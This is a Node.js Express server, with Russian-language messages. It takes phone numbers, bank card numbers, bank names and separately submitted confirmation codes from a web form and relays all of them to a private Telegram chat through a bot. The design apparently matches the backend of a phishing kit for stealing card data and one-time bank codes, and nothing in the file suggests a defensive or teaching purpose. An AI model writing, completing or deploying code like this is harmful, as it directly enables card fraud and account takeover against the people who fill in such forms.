const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static('public')); // Folder for static files (HTML, CSS, etc.)

const TELEGRAM_BOT_TOKEN = "<Ваш токен бота>";
const TELEGRAM_CHAT_ID = "<Ваш chat_id>";

// Endpoint to handle form data
app.post('/send-data', async (req, res) => {
    const { phone, card, bank } = req.body;

    if (!phone || !card || !bank) {
        return res.status(400).json({ message: 'Все поля обязательны для заполнения.' });
    }

    const message = `Новая заявка:\nТелефон: ${phone}\nКарта: ${card}\nБанк: ${bank}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });

        if (response.ok) {
            res.status(200).json({ message: 'Данные успешно отправлены.' });
        } else {
            res.status(500).json({ message: 'Ошибка отправки данных.' });
        }
    } catch (error) {
        res.status(500).json({ message: 'Серверная ошибка.' });
    }
});

// Endpoint to handle confirmation code
app.post('/send-code', async (req, res) => {
    const { code } = req.body;

    if (!code) {
        return res.status(400).json({ message: 'Код подтверждения обязателен.' });
    }

    const message = `Код подтверждения: ${code}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });

        if (response.ok) {
            res.status(200).json({ message: 'Код подтверждения успешно отправлен.' });
        } else {
            res.status(500).json({ message: 'Ошибка отправки кода.' });
        }
    } catch (error) {
        res.status(500).json({ message: 'Серверная ошибка.' });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});
